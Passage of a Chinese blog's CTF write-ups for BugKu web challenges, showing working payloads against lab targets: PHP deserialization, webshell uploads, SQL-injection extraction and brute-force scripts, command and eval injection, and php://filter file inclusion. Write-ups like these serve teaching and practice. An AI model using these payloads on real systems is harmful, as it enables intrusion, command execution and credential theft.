class="line">&#125;</span><br><span class="line">    <span class="variable">$select</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line">    <span class="variable">$res</span>=<span class="title function_ invoke__">unserialize</span>(@<span class="variable">$select</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>构造payload</p><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line">http://114.67.175.224:15293/?code=O:3:%22ctf%22:3:&#123;s:11:%22%00*%00username%22;s:5:%22admin%22;s:6:%22%00*%00cmd%22;s:12:%22tac%20flag.php%22;&#125;</span><br></pre></td></tr></table></figure><blockquote><p>__wakeup 将在序列化之后立即被调用，绕过它仅需要将上面的对象属性个数值改得比真实对象大即可。</p></blockquote><h2 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h2><p>修改字段信息上传文件</p><p><img src="https://s2.loli.net/2022/05/05/QeUturNifLd75oY.png" alt="up1.png"></p><p>使用蚁剑连接，寻找flag</p><p><img src="https://s2.loli.net/2022/05/05/GU3BfPvWMe1Z7ns.png" alt="up2.png"></p><blockquote><p>参考：<a href="https://blog.csdn.net/hintll/article/details/117947043">BugKu-Web-wp1</a></p></blockquote><h2 id="decrypt"><a href="#decrypt" class="headerlink" title="decrypt"></a>decrypt</h2><p>解压后获得源码</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">encrypt</span>(<span class="params"><span class="variable">$data</span>,<span class="variable">$key</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$key</span> = <span class="title function_ invoke__">md5</span>(<span class="string">&#x27;ISCC&#x27;</span>);</span><br><span class="line">    <span class="variable">$x</span> = <span class="number">0</span>;</span><br><span class="line">    <span class="variable">$len</span> = <span class="title function_ invoke__">strlen</span>(<span class="variable">$data</span>);</span><br><span class="line">    <span class="variable">$klen</span> = <span class="title function_ invoke__">strlen</span>(<span class="variable">$key</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$len</span>; <span class="variable">$i</span>++) &#123; </span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$x</span> == <span class="variable">$klen</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="variable">$x</span> = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$char</span> .= <span class="variable">$key</span>[<span class="variable">$x</span>];</span><br><span class="line">        <span class="variable">$x</span>+=<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$len</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">        <span class="variable">$str</span> .= <span class="title function_ invoke__">chr</span>((<span class="title function_ invoke__">ord</span>(<span class="variable">$data</span>[<span class="variable">$i</span>]) + <span class="title function_ invoke__">ord</span>(<span class="variable">$char</span>[<span class="variable">$i</span>])) % <span class="number">128</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">base64_encode</span>(<span class="variable">$str</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>可以看到里面是个加密函数，故构造解密函数即可，exp如下（注意提交的Flag形式）</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$input</span> = <span class="string">&#x27;fR4aHWwuFCYYVydFRxMqHhhCKBseH1dbFygrRxIWJ1UYFhotFjA=&#x27;</span>;  <span class="comment">//提示中的字符串</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">decrypt</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line"><span class="variable">$str</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$str</span>);</span><br><span class="line"><span class="variable">$len</span> = <span class="title function_ invoke__">strlen</span>(<span class="variable">$str</span>);</span><br><span class="line"><span class="variable">$key</span> = <span class="title function_ invoke__">md5</span>(<span class="string">&#x27;ISCC&#x27;</span>);</span><br><span class="line"><span class="variable">$klen</span> = <span class="title function_ invoke__">strlen</span>(<span class="variable">$key</span>);</span><br><span class="line"><span class="variable">$x</span> = <span class="number">0</span>;</span><br><span class="line"><span class="variable">$char</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$len</span>; <span class="variable">$i</span>++) &#123; </span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$x</span> == <span class="variable">$klen</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="variable">$x</span> = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$char</span> .= <span class="variable">$key</span>[<span class="variable">$x</span>];</span><br><span class="line">        <span class="variable">$x</span>+=<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// str = (data[i] + char[i])%128</span></span><br><span class="line">    <span class="variable">$data</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$len</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">        <span class="variable">$data</span> .= <span class="title function_ invoke__">chr</span>((<span class="number">128</span> + <span class="title function_ invoke__">ord</span>(<span class="variable">$str</span>[<span class="variable">$i</span>]) - <span class="title function_ invoke__">ord</span>(<span class="variable">$char</span>[<span class="variable">$i</span>])) % <span class="number">128</span>);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">return</span> <span class="variable">$data</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">decrypt</span>(<span class="variable">$input</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="文件包含2"><a href="#文件包含2" class="headerlink" title="文件包含2"></a>文件包含2</h2><p>F12查看发现有upload.php，然后用burp进行文件上传</p><p><img src="https://s2.loli.net/2022/05/05/YtUdriGFB6R3D8b.png" alt="up2_1.png"></p><p>用蚁剑进行连接并寻找flag</p><p><img src="https://s2.loli.net/2022/05/05/eaqdkCrXstAuH2j.png" alt="up2_2.png"></p><p><img src="https://s2.loli.net/2022/05/05/GnvJHQrsBz1jAIh.png" alt="up2_3.png"></p><h2 id="需要管理员"><a href="#需要管理员" class="headerlink" title="需要管理员"></a>需要管理员</h2><p>用dirsearch扫一遍</p><p><img src="https://s2.loli.net/2022/05/05/IWOqanhjeZNlGHt.png" alt="admin1.png"></p><p>进入robots.txt</p><p><img src="https://s2.loli.net/2022/05/05/RBtlIYqK7mAHnME.png" alt="admin2.png"></p><p>进入resusl.php</p><p><img src="https://s2.loli.net/2022/05/05/OFGyhVxZXEdBCR3.png" alt="admin3.png"></p><p>观察页面发现需要输入密码，可以使用burpsuite爆破也可以根据题目名称猜测得到（密码是admin）</p><p><img src="https://s2.loli.net/2022/05/05/eKagOyH9o6IXpdF.png" alt="admin4.png"></p><h2 id="newphp"><a href="#newphp" class="headerlink" title="newphp"></a>newphp</h2><p>打开网页即可获得源码，根据源码构造payload</p><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line">username=\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0&amp;password=a&quot;;O:4:&quot;evil&quot;:2:&#123;s:4:&quot;hint&quot;;s:8:&quot;hint.php&quot;;&#125;</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/05/05/VqFjp2Qb4TcMxeA.png" alt="newphp1.png"></p><p>base64解码后得到</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> <span class="variable">$hint</span> = <span class="string">&quot;index.cgi&quot;</span>;</span><br><span class="line"> <span class="comment">// You can&#x27;t see me~</span></span><br></pre></td></tr></table></figure><p>访问该页面</p><p><img src="https://s2.loli.net/2022/05/05/8TJwkz5a43SfoYn.png" alt="newphp2.png"></p><p>构造payload</p><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line">http://114.67.175.224:11918/index.cgi?name=%20file:////flag</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/05/05/qB5XHZveU3RwNgp.png" alt="newphp3.png"></p><blockquote><p>参考：<a href="https://blog.csdn.net/weixin_52116519/article/details/123975811">BugKu-Web-wp2</a></p></blockquote><h2 id="点login咋没反应"><a href="#点login咋没反应" class="headerlink" title="点login咋没反应"></a>点login咋没反应</h2><p>进入后查看网页源代码发现有<code>href=&quot;admin.css&quot;</code>，点进去后发现第一行有提示<code>/* try ?29614 */</code>，加入后缀后即可获得源代码</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">$KEY=&#x27;ctf.bugku.com&#x27;;</span><br><span class="line">include_once(&quot;flag.php&quot;);</span><br><span class="line">$cookie = $_COOKIE[&#x27;BUGKU&#x27;];</span><br><span class="line">if(isset($_GET[&#x27;29614&#x27;]))&#123;</span><br><span class="line">    show_source(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line">elseif (unserialize($cookie) === &quot;$KEY&quot;)</span><br><span class="line">&#123;   </span><br><span class="line">    echo &quot;$flag&quot;;</span><br><span class="line">&#125;</span><br><span class="line">else &#123;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=UTF-8&quot;&gt;</span><br><span class="line">&lt;title&gt;Login&lt;/title&gt;</span><br><span class="line">&lt;link rel=&quot;stylesheet&quot; href=&quot;admin.css&quot; type=&quot;text/css&quot;&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;br&gt;</span><br><span class="line">&lt;div class=&quot;container&quot; align=&quot;center&quot;&gt;</span><br><span class="line">  &lt;form method=&quot;POST&quot; action=&quot;#&quot;&gt;</span><br><span class="line">    &lt;p&gt;&lt;input name=&quot;user&quot; type=&quot;text&quot; placeholder=&quot;Username&quot;&gt;&lt;/p&gt;</span><br><span class="line">    &lt;p&gt;&lt;input name=&quot;password&quot; type=&quot;password&quot; placeholder=&quot;Password&quot;&gt;&lt;/p&gt;</span><br><span class="line">    &lt;p&gt;&lt;input value=&quot;Login&quot; type=&quot;button&quot;/&gt;&lt;/p&gt;</span><br><span class="line">  &lt;/form&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">&#125;</span><br><span class="line">?&gt; </span><br></pre></td></tr></table></figure><p>审计后发现构造序列化字符串使得其反序列化后与<code>$KEY</code>的值恒等即可</p><p><img src="https://s2.loli.net/2022/05/05/1WHcKEZJAsFgIVz.png" alt="login.png"></p><h2 id="都过滤了"><a href="#都过滤了" class="headerlink" title="都过滤了"></a>都过滤了</h2><p>登录界面的账号一栏可以被sql注入，编写脚本获取密码</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">change_data</span>(<span class="params">uname,data</span>):</span><br><span class="line">data[<span class="string">&#x27;uname&#x27;</span>] = uname</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">len_of_passwd</span>(<span class="params">url,data,cookie,uname</span>):</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">100</span>):</span><br><span class="line">uname = <span class="string">&quot;admin&#x27;^(length(passwd)=&quot;</span> + <span class="built_in">str</span>(i) + <span class="string">&quot;)^&#x27;&quot;</span></span><br><span class="line">change_data(uname,data)</span><br><span class="line">r = requests.post(url=url, cookies=cookie, data=data)</span><br><span class="line"><span class="keyword">if</span> <span class="string">&quot;username error!!@_@&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line"><span class="comment">#print(&quot;密码的长度是&quot;+str(i))</span></span><br><span class="line"><span class="keyword">return</span> i</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_passwd</span>(<span class="params">url,data,cookie,uname,length</span>):</span><br><span class="line">password = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, length+<span class="number">1</span>):</span><br><span class="line"><span class="keyword">for</span> ch <span class="keyword">in</span> <span class="string">&#x27;0123456789abcdefghijklmnopqrstuvwxyz&#x27;</span>:</span><br><span class="line">uname = <span class="string">&quot;admin&#x27;-(ascii(mid((passwd)from(&quot;</span> + <span class="built_in">str</span>(i) + <span class="string">&quot;)))=&quot;</span> + <span class="built_in">str</span>(<span class="built_in">ord</span>(ch)) + <span class="string">&quot;)-&#x27;&quot;</span></span><br><span class="line">change_data(uname,data)</span><br><span class="line">r = requests.post(url=url, cookies=cookie, data=data)</span><br><span class="line"><span class="keyword">if</span> <span class="string">&quot;username error!!@_@&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">password += ch</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;password:&quot;</span>,password)</span><br><span class="line">url = <span class="string">&quot;http://114.67.175.224:11041/login.php&quot;</span></span><br><span class="line">headers = &#123;</span><br><span class="line"><span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:99.0) Gecko/20100101 Firefox/99.0&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">cookie = &#123;</span><br><span class="line"><span class="string">&#x27;PHPSESSID&#x27;</span>:<span class="string">&#x27;nnff401s86pvr720ouq5qe0k40&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">uname = <span class="string">&#x27;admin&#x27;</span></span><br><span class="line">data = &#123;</span><br><span class="line"><span class="string">&#x27;uname&#x27;</span>:uname,</span><br><span class="line"><span class="string">&#x27;passwd&#x27;</span>:<span class="string">&#x27;123123&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">length = len_of_passwd(url,data,cookie,uname)</span><br><span class="line">get_passwd(url,data,cookie,uname,length)</span><br><span class="line"><span class="comment">#bukuctf:4dcc88f8f1bc05e7c2ad1a60288481a2</span></span><br></pre></td></tr></table></figure><p>登陆后输入命令<code>&#123;cat,/flag&#125;</code>即可获得flag</p><blockquote><p>参考：<a href="https://blog.csdn.net/qq_41696858/article/details/119081156">BugKu-Web-wp3</a></p></blockquote><h2 id="login2"><a href="#login2" class="headerlink" title="login2"></a>login2</h2><p>用burp抓包发现有tip字段,base64解码即可得到提示</p><p><img src="https://s2.loli.net/2022/05/05/hHV4OeurRwjZ1vM.png" alt="login2_1.png"></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT username,password FROM admin WHERE username=&#x27;&quot;</span>.<span class="variable">$username</span>.<span class="string">&quot;&#x27;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$row</span>) &amp;&amp; <span class="variable">$row</span>[<span class="string">&#x27;password&#x27;</span>]===<span class="title function_ invoke__">md5</span>(<span class="variable">$password</span>))&#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>构造<code>username=admin&#39; union select 1,md5(123)#   </code>和<code>password=123</code>即可创建一个不存在的用户通过验证，进入后使用命令<code>123| cat /flag &gt; test</code>，然后进入网址<code>http://114.67.175.224:15394/test</code>即可获得flag。</p><p><img src="https://s2.loli.net/2022/05/05/wByZDhxQitfTlrg.png" alt="login2_2.png"></p><blockquote><p>参考：<a href="https://blog.csdn.net/weixin_58111246/article/details/123482301">Bugku-Web-wp4</a></p><p>还有反弹shell的做法：<a href="https://www.jianshu.com/p/4f8d8d8b7b31">https://www.jianshu.com/p/4f8d8d8b7b31</a></p></blockquote><h2 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h2><p>盲猜账号<code>admin</code>和密码<code>bugkuctf</code>，然后直接拿到了flag。</p><blockquote><p>大佬的注入过程：<a href="https://blog.csdn.net/plant1234/article/details/118033711">sql注入</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> CTF_Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
            <tag> BugKu </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BugKu Web 刷题记录3</title>
      <link href="/2022/04/27/BugKu-Web3/"/>
      <url>/2022/04/27/BugKu-Web3/</url>
      
        <content type="html"><![CDATA[<h1 id="BugKu-Web-刷题记录3"><a href="#BugKu-Web-刷题记录3" class="headerlink" title="BugKu Web 刷题记录3"></a>BugKu Web 刷题记录3</h1><blockquote><p>参考：</p><p><a href="https://www.php.net/exec">PHP程序执行</a></p><p><a href="https://zhuanlan.zhihu.com/p/401583380">BugKu-Web-wp1</a></p><p><a href="https://blog.csdn.net/weixin_58111246/article/details/123971455?spm=1001.2014.3001.5501">BugKu-Web-wp2</a></p><p><a href="https://www.jianshu.com/p/2dbb1b38de1e">BugKu-Web-wp3</a></p></blockquote><h2 id="game1"><a href="#game1" class="headerlink" title="game1"></a>game1</h2><p>一局游戏结束后，发现抓到了一个可疑的数据包</p><p><img src="https://s2.loli.net/2022/04/27/qpcmtIiEDoKwRuM.png" alt="game1_1.png"></p><p>猜测sign字段是base64加密的，但解码后发现是无用字符，又对score字段尝试base64加密，发现25的base64码是<code>MjU=</code>，故猜测sign字段本质上是不是<code>&#39;zM&#39;+&#39;base64_encode(score)&#39;+&#39;==&#39;</code>这样组成的，发送后发现确实可以得到flag</p><p><img src="https://s2.loli.net/2022/04/27/c5I9fRCyYVqFkwi.png" alt="game1_2.png"></p><h2 id="eval"><a href="#eval" class="headerlink" title="eval"></a>eval</h2><h3 id="方法1"><a href="#方法1" class="headerlink" title="方法1"></a>方法1</h3><p>先试试传入全局变量看看其中内容</p><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line">http://114.67.175.224:13624/?hello=$GLOBALS</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/04/27/3mGOYDJhBH8264i.png" alt="eval1.png"></p><p>很好，被嘲讽了。eval会执行传入字符串，故构造payload让其执行命令</p><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line">http://114.67.175.224:13624/?hello=);show_source(&#x27;flag.php&#x27;);var_dump(</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/04/27/4u1rN5TXjQaVF63.png" alt="eval2.png"></p><h3 id="方法2"><a href="#方法2" class="headerlink" title="方法2"></a>方法2</h3><p>也可以直接使用file</p><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line">http://114.67.175.224:13624/?hello=file(&#x27;flag.php&#x27;)</span><br></pre></td></tr></table></figure><h2 id="source"><a href="#source" class="headerlink" title="source"></a>source</h2><p>扫描发现有git文件泄露，故下载git文件（linux下）</p><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="attribute">wget</span> -r http://114.67.175.224:19331/.git</span><br></pre></td></tr></table></figure><p>进入日志目录下</p><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="attribute">cd</span> <span class="number">114.67.175.224:19331</span>/.git/logs</span><br></pre></td></tr></table></figure><p>查看信息</p><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="attribute">git</span> reflog</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/04/27/9iGlevcpH3gEZjJ.png" alt="source1.png"></p><p>使用git show命令查看文件，最终在40c6d51文件里找到flag</p><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="attribute">git</span> show 40c6d51</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/04/27/jXeQsLpJgoF5ril.png" alt="source2.png"></p><h2 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h2><h3 id="方法1-1"><a href="#方法1-1" class="headerlink" title="方法1"></a>方法1</h3><p>尝试查看源码</p><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line">http://114.67.175.224:10060/index.php?file=php://filter/read=convert.base64-encode/resource=index.php</span><br></pre></td></tr></table></figure><p>base64解码后获得源码和flag</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;title&gt;Bugku-web&lt;/title&gt;</span><br><span class="line">    </span><br><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">if(!$_GET[file])&#123;echo &#x27;&lt;a href=&quot;./index.php?file=show.php&quot;&gt;click me? no&lt;/a&gt;&#x27;;&#125;</span><br><span class="line">$file=$_GET[&#x27;file&#x27;];</span><br><span class="line">if(strstr($file,&quot;../&quot;)||stristr($file, &quot;tp&quot;)||stristr($file,&quot;input&quot;)||stristr($file,&quot;data&quot;))&#123;</span><br><span class="line">echo &quot;Oh no!&quot;;</span><br><span class="line">exit();</span><br><span class="line">&#125;</span><br><span class="line">include($file); </span><br><span class="line">//flag:flag&#123;ee54957897543831f6aa21d30f46913d&#125;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="方法2-1"><a href="#方法2-1" class="headerlink" title="方法2"></a>方法2</h3><p>也可以直接构造该payload获得flag</p><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line">http://114.67.175.224:10060/index.php?file=//flag</span><br></pre></td></tr></table></figure><h2 id="好像需要密码"><a href="#好像需要密码" class="headerlink" title="好像需要密码"></a>好像需要密码</h2><p>直接5位纯数字爆破（密码是12468)，exp如下</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">lens = <span class="number">5</span></span><br><span class="line"><span class="keyword">for</span> password <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">100000</span>):</span><br><span class="line">password = <span class="built_in">str</span>(password)</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">len</span>(password)&lt;lens):</span><br><span class="line">diff = lens-<span class="built_in">len</span>(password)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(diff):</span><br><span class="line">password = <span class="string">&#x27;0&#x27;</span> + password</span><br><span class="line">test = requests.post(<span class="string">&#x27;http://114.67.175.224:15735/&#x27;</span>,data=&#123;<span class="string">&#x27;pwd&#x27;</span>: password&#125;)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;当前测试的密码为：&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(password)</span><br><span class="line"><span class="keyword">if</span> <span class="string">&#x27;flag&#x27;</span> <span class="keyword">in</span> test.text:</span><br><span class="line">flag = re.findall(<span class="string">&quot;flag\&#123;(.*)?\&#125;&quot;</span>,test.text)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;[+]正确的密码为：&#x27;</span>,password)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;[*]flag&#123;&#x27;</span>+flag[<span class="number">0</span>]+<span class="string">&#x27;&#125;&#x27;</span>)</span><br><span class="line"><span class="keyword">break</span></span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/04/27/3dtQCz5cogAI9F4.png" alt="password.png"></p><h2 id="No-one-knows-regex-better-than-me"><a href="#No-one-knows-regex-better-than-me" class="headerlink" title="No one knows regex better than me"></a>No one knows regex better than me</h2><p>打开网页即可获得源码，本地分析源码测试如下</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$zero</span> = <span class="string">&quot;\\ZmxhZw==&quot;</span>; <span class="comment">//&#x27;ZmxhZw==&#x27;是flag的base64编码</span></span><br><span class="line"><span class="variable">$first</span>=<span class="string">&quot;ag/\\|.php&quot;</span>;</span><br><span class="line"><span class="variable">$second</span>=<span class="variable">$zero</span>.<span class="variable">$first</span>;</span><br><span class="line"><span class="comment">// echo $second;</span></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match_all</span>(<span class="string">&quot;/Yeedo|wants|a|girl|friend|or|a|flag/i&quot;</span>,<span class="variable">$second</span>))&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;[1]&quot;</span>;</span><br><span class="line">    <span class="variable">$key</span>=<span class="variable">$second</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\.\.|flag/&quot;</span>,<span class="variable">$key</span>))&#123; </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Noooood hacker!&quot;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;[2]&quot;</span>;</span><br><span class="line">        <span class="variable">$third</span>=<span class="variable">$first</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\\|\056\160\150\x70/i&quot;</span>,<span class="variable">$third</span>))&#123; <span class="comment">// |.php</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;[3]&quot;</span>;</span><br><span class="line">            <span class="variable">$end</span>=<span class="title function_ invoke__">substr</span>(<span class="variable">$third</span>,<span class="number">5</span>);</span><br><span class="line">            <span class="comment">// echo $zero;</span></span><br><span class="line">            <span class="comment">// echo $end;</span></span><br><span class="line">            <span class="comment">// highlight_file(base64_decode($zero).$end);//maybe flag in flag.php</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$zero</span>).<span class="variable">$end</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="comment">// highlight_file(__FILE__);</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;fail!!!&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>写脚本提交即可，exp如下：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://114.67.175.224:17373/&quot;</span></span><br><span class="line">data = &#123;</span><br><span class="line"><span class="string">&#x27;zero&#x27;</span>:<span class="string">&quot;\\ZmxhZw==&quot;</span>, <span class="comment">#ZmxhZw==</span></span><br><span class="line"><span class="string">&#x27;first&#x27;</span>:<span class="string">&quot;ag/\\|.php&quot;</span> <span class="comment">#aaaa|.php</span></span><br><span class="line">&#125;</span><br><span class="line">response = requests.post(url=url,data=data);</span><br><span class="line"><span class="built_in">print</span>(response.text)</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/04/27/V5Yd92Ri3HZNUvW.png" alt="better_re.png"></p><h2 id="shell"><a href="#shell" class="headerlink" title="shell"></a>shell</h2><p>先查看提示，分析后如下</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$poc</span> = <span class="string">&quot;a#s#s#e#r#t&quot;</span>;</span><br><span class="line"><span class="variable">$poc_1</span>=<span class="title function_ invoke__">explode</span>(<span class="string">&quot;#&quot;</span>,<span class="variable">$poc</span>);</span><br><span class="line"><span class="comment">//print_r($poc_1);</span></span><br><span class="line"><span class="variable">$poc_2</span>=<span class="variable">$poc_1</span>[<span class="number">0</span>].<span class="variable">$poc_1</span>[<span class="number">1</span>].<span class="variable">$poc_1</span>[<span class="number">2</span>].<span class="variable">$poc_1</span>[<span class="number">3</span>].<span class="variable">$poc_1</span>[<span class="number">4</span>].<span class="variable">$poc_1</span>[<span class="number">5</span>];</span><br><span class="line"><span class="comment">//print_r($poc_2);</span></span><br><span class="line"><span class="variable">$poc_2</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;s&#x27;</span>]); <span class="comment">//assert($_GET[&#x27;s&#x27;])</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>发现传入s即可，故构造payload，先执行ls命令查看有哪些文件</p><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line">http://114.67.175.224:11841/?s=system(%27ls%27)</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/04/27/esdpv8BWliSRng4.png" alt="shell1.png"></p><p>查看该txt文件即可获得flag</p><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line">http://114.67.175.224:11841/?s=system(%27cat%20flaga15808abee46a1d5.txt%27)</span><br></pre></td></tr></table></figure><p><img 